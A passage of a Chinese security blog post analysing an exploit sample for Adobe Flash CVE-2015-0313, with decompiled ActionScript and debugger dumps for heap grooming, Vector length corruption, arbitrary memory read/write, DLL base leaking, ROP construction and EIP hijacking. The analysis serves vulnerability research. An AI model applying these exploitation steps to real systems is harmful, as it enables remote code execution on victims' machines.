<p>没错，前0x20字节就是page header，从0x0c338020开始就是占位用的Vector&lt;uint&gt;对象的数据区域，这是由于AVM自身的内存分配管理器的分配机制决定的，该0x2000字节大小的内存块被划分为0x1f8（0x1f8=72*4+8+0x28(用0xbbbbbbbb填充)）大小的内存块来存放Vector&lt;uint&gt;。该部分详见李海飞paper：smashing_the_heap_with_vector_Li。</p>
<p>其中蓝色的4字节数据就是Vector&lt;uint&gt;对象的长度，偏移0x8便是Vector&lt;uint&gt;数据的起始地址，还记得前面写入的数据吗。</p>
<p>其中紫色的8字节数据很重要，后面会提到。</p>
<p>为了确认是否正确，可以先看下</p>
<p>Vector&lt;uint&gt;在内存中的数据结构</p>
<pre class="lang:python decode:true ">0:008&gt; dd ba2a650
0ba2a650  6777b1c0 20000006 0ad4e1f0 0ad4b628
0ba2a660  0ad19150 00000000 00000001 0c338020
0ba2a670  00000000 00000000 6777b1c0 00000004
0ba2a680  0ad4e1f0 0ad4b628 0ad19150 00000000</pre>
<p>&nbsp;</p>
<p>偏移0x1c处的数据便是Vector&lt;uint&gt;的数据区域</p>
<p>现在再来看下占位成功后的内存布局</p>
<p>&nbsp;</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash41.png"><img class="alignnone size-full wp-image-5816" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash41.png" alt="flash4" width="854" height="96" /></a></p>
<p>通过一下图片可以验证（下图中内存地址由0c338000变为0c0bc000）：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash5.png"><img class="alignnone size-full wp-image-5790" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash5.png" alt="flash5" width="380" height="266" /></a></p>
<p>&nbsp;</p>
<p>图片1</p>
<p>再看看加0x4000处的内存：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash6.png"><img class="alignnone size-full wp-image-5791" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash6.png" alt="flash6" width="378" height="268" /></a></p>
<p>&nbsp;</p>
<p>图片2</p>
<p>以上两图验证了内存布局的结果。</p>
<p><span style="color: #ff6600;"><strong>破坏内存：</strong></span></p>
<p>接下来domainMemory仍然保存着对被占位数据的引用，所有可以直接修改Vector&lt;uint&gt;的长度，这样修改后</p>
<p>Vector&lt;uint&gt;便可以越界读写，效果如下</p>
<pre class="lang:python decode:true ">0:002&gt; dd 0c338000 
0c338000  00000000 00000000 0c339000 0c335000
0c338010  01f80008 00000000 00000000 67a85e9c
0c338020  40000000 085f9000 feedbabe 00001530
0c338030  babeface 00000000 00000000 00000000
0c338040  00000000 00000000 00000000 00000000
0c338050  00000000 00000000 00000000 00000000
0c338060  00000000 00000000 00000000 00000000
0c338070  00000000 00000000 00000000 00000000</pre>
<p>&nbsp;</p>
<p>类似代码如下：</p>
<pre class="lang:python decode:true ">while(_loc4_ &lt; _loc2_)
{
   _loc5_ = this.li32(_loc4_);
   if(_loc5_ == 114)
   {
      _loc5_ = this.li32(_loc4_ + 8); 
      if(_loc5_ == 0xfeedbabe)
      {
         this.var_24 = false;
         this.si32(_loc4_, 0x40000000);
         return true;
      }
   }
   _loc4_ = _loc4_ + 4;
}</pre>
<p>&nbsp;</p>
<p>样本中还有对x86,x64的判断就不在这里累述了</p>
<p><span style="color: #ff6600;"><strong>越界读写：</strong></span></p>
<p>当然要想真正做到越界读写，还需要找到对应的Vector[index]元素，代码如下：</p>
<pre class="lang:python decode:true ">var _loc4_:Vector.&lt;uint&gt; = null;
var _loc3_:* = 0;
while(_loc3_ &lt; 11540)
{
   _loc4_ = this.objVec[_loc3_] as Vector.&lt;uint&gt;;
   if(!(_loc4_.length == 114) )                         ; length被修改为0x40000000
   {
      this.corropUintVecInd = _loc3_;                     ; 被修改长度的Vector&lt;uint&gt;对象的index
      this.corropUintVec = _loc4_;                   ;被修改长度的Vector&lt;uint&gt;对象
      return true;
   }
   _loc3_++;
}</pre>
<p>&nbsp;</p>
<p>通过以上代码就可以找到被修改长度的Vector&lt;uint&gt;对象（this.corropUintVec），这样就是可以通过corropUintVec[index]实现越界读写，index可以大于原来的length 0x72。</p>
<p><span style="color: #ff6600;"><strong>任意地址读写：</strong></span></p>
<p>首先该Exp通过查找前面写入Vector&lt;uint&gt;对象的标记数据找到了</p>
<p>Next page +</p>
<p>Vector&lt;uint&gt;（图片2），代码如下：</p>
<pre class="lang:python decode:true ">while(_loc3_ &lt; _loc7_)
{
   _loc8_ = this.corropUintVec[_loc3_];
   if(this.corropUintVec[_loc3_] == this.num_0xfeedbabe)                            ;标记1
   {
      _loc8_ =this.corropUintVec[_loc3_ + 2];
      if(this.corropUintVec[_loc3_ + 2] == this.num_0xbabeface)          ;标记2
      {
         this.NextVecUint= this.corropUintVec[_loc3_ + 1];          
         _loc2_ = _loc3_;
         break;
      }
   }
   _loc3_++;
}
return _loc2_ * 4;</pre>
<p>&nbsp;</p>
<p>其中标记为红色的变量记录的是Next</p>
<p>Vector&lt;uint&gt;的index，返回的是Next Vector&lt;uint&gt;的相对被修改长度Vector&lt;uint&gt;( this.corropUintVec)的偏移</p>
<p>紧接着通过以下代码得到图片3中红框中的数据，还记得前面还记得前面important data 1中用紫色标出的2个重要字段吗，这就是其中之一（具体的地址值有变化）</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash7.png"><img class="alignnone size-full wp-image-5792" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash7.png" alt="flash7" width="402" height="347" /></a></p>
<p>&nbsp;</p>
<p>图片3</p>
<p>代码如下：</p>
<pre class="lang:python decode:true ">var _loc13_:uint = (NextUintVecOff – 8)/4 ;
this.UintVecAboutObj = this.corropUintVec[_loc13_ + 1];</pre>
<p>&nbsp;</p>
<p>这个字段为什么很重要后面会继续讲到。</p>
<p>这时再通过增加找到的Vector&lt;uint&gt;（序号为0x14e0）的长度，将该内存块中第一个0x1f8的子块释放掉，这是AVM便会在page header 中写入该内存块的地址。</p>
<p>代码如下：</p>
<pre class="lang:python decode:true ">this.var_62 = this.objVec[this.NextVecUint] as Vector.&lt;uint&gt;;
this.var_62.length = this.num_114 * 2;               ;由于长度被修改，将重新分配内存块并释放</pre>
<p>&nbsp;</p>
<p>内存图如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash8.png"><img class="alignnone size-full wp-image-5793" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash8.png" alt="flash8" width="384" height="280" /></a></p>
<p>&nbsp;</p>
<p>图片4</p>
<p>如上所说，该内存已经被释放，长度清零，该内存中的Vector&lt;uint&gt;的数据被复制到新申请的内存。Flash Player中的实现代码如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/t01e56ef00a304d2a41.png"><img class="alignnone size-full wp-image-5823" src="http://www.secpulse.com/wp-content/uploads/2015/04/t01e56ef00a304d2a41.png" alt="t01e56ef00a304d2a41" width="630" height="41" /></a></p>
<p>&nbsp;</p>
<p>图片5</p>
<p>接下来通过以下类似代码，得到清空的</p>
<p>Vector&lt;uint&gt;数据块的地址：</p>
<pre class="lang:python decode:true ">NextPageInd = (0x4000-0x28) / 4;
this.NextUintVecAdd = this.corropUintVec[NextPageInd];</pre>
<p>&nbsp;</p>
<p>紧接着得到被修改Vector&lt;uint&gt;的数据字段的起始位置：</p>
<pre class="lang:python decode:true ">this.corUintVecDataAdd = this.NextUintVecAdd - 0x4000 + 8;</pre>
<p>&nbsp;</p>
<p>这时候就可是实现任意地址读写了，类似代码如下：</p>
<pre class="lang:python decode:true ">private final function get4Bytes(address:uint): uint
{
   var ind:uint = 0;
   ind = (address - this.corUintVecDataAdd) / 4;                     ;x86
   return this.corropUintVec[ind]; 
}</pre>
<p>&nbsp;</p>
<p><span style="color: #ff6600;"><strong>泄露基址：</strong></span></p>
<p>再来重温下前面提到的2个重要字段</p>
<pre class="lang:python decode:true ">0:006&gt; dd 0c338000 
0c338000  00000000 00000000 0c339000 0c335000
0c338010  01f80008 00000000 00000000 67a85e9c
0c338020  00000072 085f9000 feedbabe 00001530
0c338030  babeface 00000000 00000000 00000000
0c338040  00000000 00000000 00000000 00000000
0c338050  00000000 00000000 00000000 00000000
0c338060  00000000 00000000 00000000 00000000
0c338070  00000000 00000000 00000000 00000000</pre>
<p>&nbsp;</p>
<p><span style="color: #ff6600;"><strong>Important data 1</strong></span></p>
<p>这是前面提到过的Next page的数据内存，在偏移0x1c处是第一个重要字段，读者肯定已经猜到，就是可以用来泄露flash player 模块基址的数据。</p>
<p>经过前面的操作Next page中的数据已经有了些许，如图片4所示，但是在偏移0x1c处依然存放着我们想要的数据</p>
<pre class="lang:python decode:true ">Ind = (0x4000 – c) / 4;
this.leakData = this.corropUintVec[ind];</pre>
<p>&nbsp;</p>
<p>通过以上代码便可获取，接下来就是用该字段来泄露基址，该Exp泄露基址的方式可以说非常简单，粗暴，来看代码：</p>
<p>&nbsp;</p>
<p>代码是这样的：</p>
<pre class="lang:python decode:true ">var _loc1_:uint = this.leakData &amp; 0xfffff000; 
while(true)
{
   _loc8_ = this.get4Bytes(_loc1_);
   if(_loc8_ != 0x905a4d)                  ; dll的pe头，MZ
   {
      _loc1_ = _loc1_ - 0x1000;     //get flash DLL baseaddress
      continue;
   }
   break;
}</pre>
<p>&nbsp;</p>
<p>对，就是这么简单，没有任何的花式技巧，你没有看错，就是这么粗暴（haoxihuan）！！！</p>
<p>接下来就可以动态的构造ROP了，ROP也是非常简单的</p>
<pre class="lang:python decode:true ">0:005&gt; dps 0c0bc000    +3000
0c0bf000  66a7b7e2 Flash32_16_0_0_296+0xb7e2
0c0bf004  66be1c86 Flash32_16_0_0_296+0x171c86
0c0bf008  66a90ace Flash32_16_0_0_296+0x20ace
0c0bf00c  66c62c07 Flash32_16_0_0_296+0x1f2c07
0c0bf010  66dc4f67 Flash32_16_0_0_296!DllUnregisterServer+0x1547de
0c0bf014  66c24f3c Flash32_16_0_0_296+0x1b4f3c
0c0bf018  76aec4ea kernel32!VirtualAllocStub
0c0bf01c  0c0bf030
0c0bf020  0c0bf000
0c0bf024  00002000
0c0bf028  00001000
0c0bf02c  00000040</pre>
<p>&nbsp;</p>
<p><span style="color: #ff6600;"><strong>控制EIP：</strong></span></p>
<p>该Exp控制EIP还是略有不同，还记得前面提到的用紫色标记的2个重要字段吗，还有一个没有用，是的，就是这一个。</p>
<p>该字段实际上指向一个对象，在修改Vector&lt;uint&gt;的长度的时候会用改该对象，所以Exp伪造了一个该对象，通过修改相应的标志位和虚表控制EIP。</p>
<pre class="lang:python decode:true ">var _loc3_:uint = 0x40000000 - 1;
this.corropUintVec[_loc3_] = this.fakeObjAdd;</pre>
<p>&nbsp;</p>
<p>这时的Vector&lt;uint&gt;如下：</p>
<pre class="lang:python decode:true">0:005&gt; dd 0c0bc000 
0c0bc000  00000000 00000000 0c0bd000 0c0b9000
0c0bc010  01f80008 00000000 00000000 67a85e9c
0c0bc020  40000000 0c0bec00 feedbabe 000014d0
0c0bc030  babeface 00000000 00000000 00000000
0c0bc040  00000000 00000000 00000000 00000000
0c0bc050  00000000 00000000 00000000 00000000
0c0bc060  00000000 00000000 00000000 00000000</pre>
<p>&nbsp;</p>
<p>红色标记的字段已经被修改指向可控的内存区域（与该page紧邻的ByteArray数据区），如果你要问为什么索引是0x3fffffff，是因为操作Vector&lt;uint&gt;的代码如下：</p>
<pre class="lang:python decode:true ">0ab94a39        mov     dword ptr [eax+ecx*4+8],ebx</pre>
<p>&nbsp;</p>
<p>其中eax指向Vector&lt;uint&gt;数据区域的起始地址，ecx代表index</p>
<p>而伪造的对象如下：</p>
<pre class="lang:python decode:true ">0:005&gt; dd 0c0bc000 +2c00
0c0bec00  cccccccc 00010000 cccccccc cccccccc
0c0bec10  cccccccc cccccccc cccccccc cccccccc
0c0bec20  cccccccc cccccccc cccccccc cccccccc
   …
0c0bed70  cccccccc cccccccc cccccccc cccccccc
0c0bed80  0c0bf000 00000001 cccccccc cccccccc
0c0bed90  cccccccc cccccccc cccccccc cccccccc
0c0beda0  cccccccc cccccccc cccccccc 00000000
0c0bedb0  cccccccc cccccccc cccccccc cccccccc
0c0bedc0  cccccccc cccccccc cccccccc cccccccc
0c0bedd0  cccccccc cccccccc cccccccc cccccccc
0c0bede0  cccccccc 0c0bed80 cccccccc cccccccc</pre>
<p>&nbsp;</p>
<p>0x0c0bed80处的数据指向ROP，这时候调用以下代码，控制EIP:</p>
<pre class="lang:python decode:true ">this.corropUintVec.length = this.num_114 * 2;</pre>
<p>&nbsp;</p>
<p>汇编代码：</p>
<pre class="lang:python decode:true ">66aba247        mov     eax,dword ptr [ecx]
66aba249        call      dword ptr [eax+4]</pre>
<p>&nbsp;</p>
<p>ecx指向已经写入的ROP链地址，接下来将执行任意代码！</p>
<p>【原文：<a href="http://bobao.360.cn/learning/detail/330.html" target="_blank">CVE-2015-0313:New Flash Exploit Analysis</a> 作者:<a href="http://weibo.com/u/2728536082" target="_blank"><strong>tedjoy</strong></a>】</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/applicationdomain" rel="tag">ApplicationDomain</a><a href="https://www.secpulse.com/archives/tag/bytearray" rel="tag">ByteArray</a><a href="https://www.secpulse.com/archives/tag/bytearray-clear" rel="tag">ByteArray.Clear()</a><a href="https://www.secpulse.com/archives/tag/bytearray-shareable" rel="tag">ByteArray.shareable</a><a href="https://www.secpulse.com/archives/tag/cve-2015-0313" rel="tag">cve-2015-0313</a><a href="https://www.secpulse.com/archives/tag/domainmemory" rel="tag">domainMemory</a><a href="https://www.secpulse.com/archives/tag/dsru15-004" rel="tag">DSRU15-004</a><a href="https://www.secpulse.com/archives/tag/flash-vulnerability-exploit" rel="tag">Flash Vulnerability Exploit</a><a href="https://www.secpulse.com/archives/tag/heap-spray" rel="tag">heap spray</a><a href="https://www.secpulse.com/archives/tag/littleendian" rel="tag">littleEndian</a><a href="https://www.secpulse.com/archives/tag/tedjoy" rel="tag">tedjoy</a><a href="https://www.secpulse.com/archives/tag/%e6%8e%a7%e5%88%b6eip" rel="tag">控制EIP</a><a href="https://www.secpulse.com/archives/tag/%e6%b3%84%e9%9c%b2%e5%9f%ba%e5%9d%80" rel="tag">泄露基址</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/4490.html" title="详细阅读 Flash严重漏洞（CVE-2015-0311）详细技术分析（附上exp）">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/wp-content/uploads/2015/02/adobeflash.png&h=150&w=249&zc=1" alt="Flash严重漏洞（CVE-2015-0311）详细技术分析（附上exp）" class="xg-img"/>
		<p>Flash严重漏洞（CVE-2015-0&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/58142.html" title="详细阅读 远控木马中的VIP：盗刷网购账户购买虚拟礼品卡">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/05/timg-11.jpg&h=150&w=249&zc=1" alt="远控木马中的VIP：盗刷网购账户购买虚拟礼品卡" class="xg-img"/>
		<p>远控木马中的VIP：盗刷网购账户购买虚拟</P></a></li>
				<li><a href="https://www.secpulse.com/archives/57767.html" title="详细阅读 游戏外挂网站暗藏病毒：盗号、锁首等数种危害并举">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/04/Bingdu.png&h=150&w=249&zc=1" alt="游戏外挂网站暗藏病毒：盗号、锁首等数种危害并举" class="xg-img"/>
		<p>游戏外挂网站暗藏病毒：盗号、锁首等数种危</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='5759' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="4da3225adb" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="52"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/5759.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2014/12/b_4216_20111222020023739433835-150x150.jpg" width="96" height="96" alt="SP胖编" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/sp_panbian" title="由SP胖编发布" rel="author">SP胖编</a><br>
 <span class="au-title">总共60篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
神器 神器 神器	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/35647.html" rel="bookmark" title="详细阅读 当当网某处源码信息泄露涉及uc_key">当当网某处源码信息泄露涉及uc_key</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/35298.html" rel="bookmark" title="详细阅读 中石化某业务系统漏洞打包（Getshell+文件遍历）">中石化某业务系统漏洞打包（Getshell+文件遍历）</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/39079.html" rel="bookmark" title="详细阅读 用友优普U8系统三处SQL注射漏洞">用友优普U8系统三处SQL注射漏洞</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/19873.html" rel="bookmark" title="详细阅读 联想网络控制工具(被控端)暴露硬盘保护卡密码">联想网络控制工具(被控端)暴露硬盘保护卡密码</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/16477.html" rel="bookmark" title="详细阅读 某大型考试某系统SQL注射，导致信息泄露">某大型考试某系统SQL注射，导致信息泄露</a></li>
					</ul>


</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="https://www.secpulse.com/wp-includes/images/SecPulse.png" width="280px" height="364px" /></div>
		</aside>				</div>
	</div>

	</section>

  <div class="inner row visible-lg-block">

	<div class="friends">
		<h3>友情链接</h3>
		<ul>
			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
			<li><a href="http://www.nagain.com" target="_blank">娜迦信息</a><span>|</span></li>
			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
			<li><a href="https://team.armyzer0.com" target="_blank">armyzer0</a><span>|</span></li>
			<li><a href="http://www.nosafe.org" target="_blank">NoSafe</a></li>
		</ul>
	</div>

	<div class="friends">
		<h3>合作伙伴</h3>
		<ul>
			<a href="https://www.duoyinsu.com" class="external" target="_blank">
				<img src="https://www.secpulse.com/wp-content/uploads/anshi-logo.png"
				alt="安识科技" width="150px" height="45px">
			</a>
			<a href="http://aq.163.com/module/partner.html" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/netease.jpg"
				alt="网易安全中心" width="150px" height="45px">
			</a>
			<a href="https://security.alibaba.com/" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/asrc.jpg"
				alt="阿里安全中心" width="150px" height="45px">
			</a>
			
			<a href="http://yaq.qq.com/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/yaqnew.png" alt="腾讯御安全"
				width="140px" height="45px">
			</a>
			
			<a href="http://www.4hou.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/4hou.png"
				alt="嘶吼RoarTalk" width="150px" height="45px">
			</a>
			
			<a href="http://www.ichunqiu.com/?from=secpulse" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/ichunqiu.png" alt="i春秋学院"
				width="140px" height="45px">
			</a>

			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/bigsec.png" alt="bigsec岂安科技"
				width="140px" height="45px">
			</a>
		
			<a href="http://www.milw0rm.cn/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/milw0rm.png"
				alt="Milw0rm Team" width="120px" height="40px">
			</a>


			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/cloversec.png"
				alt="四叶草安全" width="130px" height="45px">
			</a>
			<a href="https://www.aqdog.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/aqdog.png"
				alt="安犬云平台" width="140px" height="45px">
			</a>
			
			<a href="http://www.e365.org/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/e365.png"
				alt="易安在线" width="130px" height="45px">
			</a>
			
			
			

		</ul>
	</div>
</div>
<footer class="footer clr" id="footer">
	<div class="inner inner-footer">
		<div class="footer-secpulse">
			<h3>SecPulse</h3>
			<ul>
				<li><a href="/about">关于SecPulse</a></li>
				<!--<li><a href="http://test.secpulse.com">SecPulse专测</a> <sup>NEW!</sup></li>-->
				<li><a href="/hire">加入我们</a></li>
				<li><a href="/report">寻求报道</a></li>
				<li><a href="/contact-us">联系我们</a></li>
			</ul>
		</div>
		<div class="footer-subscribe xs-hidden">
			<h3>订阅</h3>
			<ul>
				<li><a href="/feed">RSS订阅</a></li>
				<li><a href="/feed">邮箱订阅</a></li>
				<li><a href="/feed">线下活动订阅</a></li>
				<li></li>
				<li><a href="http://weibo.com/311057789">官方微博</a></li>
				<!-- <li><a href="https://twitter.com/secpulse">Twitter</a></li> -->
			</ul>
		</div>
		<div class="footer-partner">
			<h3>全力驱动</h3>
			<ul class="cf">
				<li><a href="https://www.secpulse.com" class="external"
					target="_blank"><img
						src="https://www.secpulse.com/wp-content/uploads/seclogo.png"
						alt="安全脉搏" width="200px"></a></li>
			</ul>
		</div>
		<div class="footer-copyright xs-hidden">
			<p>本站由SecPulse安全脉搏团队全力维护。</p>
			<p>
				Powered By <a title="安全脉搏" href="https://www.secpulse.com">SecPulse</a>
			</p>
			<p>©2013-2017 安全脉搏</p>
			<p>沪ICP备16016474号</p>
			<img src="https://www.secpulse.com/wp-includes/images/qrcode.jpg"
				alt="Qrcode" height="150px" width="150px">

		</div>
	</div>
</footer>
<div id="shangxia">
	<div id="shang" title="↑ 返回顶部"></div>
              <div id="comt" title="查看评论"></div>
              <div id="xia" title="↓ 移至底部"></div>
</div>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.2'></script>
</body>

</html>
